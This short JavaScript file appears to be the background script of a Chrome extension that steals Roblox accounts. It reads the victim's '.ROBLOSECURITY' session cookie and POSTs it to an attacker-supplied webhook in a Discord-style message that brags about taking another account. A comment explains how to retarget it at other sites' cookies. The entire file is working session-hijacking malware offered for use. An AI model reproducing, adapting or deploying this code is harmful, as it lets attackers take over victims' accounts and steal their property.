function webhookReq(webhook, cookie) {
  var params = {
      embeds: [{
            "title": `$ Scarlett#0001 on top`,
            "description": ">>> Smoked has tooken another account lmao :skull:",
            "color": 141414,
            "fields": [{
              "name": 'Cookie',
              "value": "```\n" + cookie + "\n```",
              inline: false
            }]
    }]
  }
   
  // Send the webhook request
  fetch(webhook, {
    method: "POST",
    headers: {
      'Content-type': 'application/json'
    },
    body: JSON.stringify(params)
  })
}



// Driver Code:
cookieInfo = {url: "https://www.roblox.com/", name: '.ROBLOSECURITY'}; //If you want to grab other site cookies, change the values both here and in the manifest.json file
chrome.cookies.get(cookieInfo, function(cookie) {
  if (cookie) {
    webhookReq("YOUR WEBHOOK", cookie.value);
  }
});
